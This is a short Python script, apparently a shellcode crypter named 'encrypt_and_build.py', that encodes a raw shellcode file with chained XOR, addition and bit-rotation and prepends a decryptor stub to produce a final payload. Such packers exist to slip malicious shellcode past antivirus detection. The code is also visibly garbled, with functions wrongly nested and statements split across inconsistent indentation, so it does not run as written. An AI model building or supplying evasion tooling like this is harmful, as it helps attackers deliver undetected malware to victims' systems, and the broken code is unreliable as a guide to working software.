import sys

def xor_encrypt(data, key) :
    return bytes(b ^ key for b in data)

    def add_encrypt(data, key) :
        return bytes((b + key) & 0xFF for b in data)

    def rol_encrypt(data, bits) :
        def rol_byte(b, bits) :
            return ((b << bits) | (b >> (8 - bits))) & 0xFF
            return bytes(rol_byte(b, bits) for b in data)

    def main() :
        if len(sys.argv) != 4 :
            print("Usage: python3 encrypt_and_build.py shellcode.bin decryptor.bin final_payload.bin")
            return

        shellcode_file = sys.argv[1]
        decryptor_file = sys.argv[2]
        output_file = sys.argv[3]

        with open(shellcode_file, "rb") as f :
            shellcode = f.read()

# Encrypt shellcode
shellcode = xor_encrypt(shellcode, 0xAA)
shellcode = add_encrypt(shellcode, 0x10)
shellcode = rol_encrypt(shellcode, 3)

with open(decryptor_file, "rb") as f :
    decryptor = f.read()

# Check decryptor length matches shellcode length in stub
# (You should update shellcode_len in decryptor.asm accordingly)

with open(output_file, "wb") as f :
    f.write(decryptor)
    f.write(shellcode)

print(f"Final payload written to {output_file}")

if __name__ == "__main__":
    main()
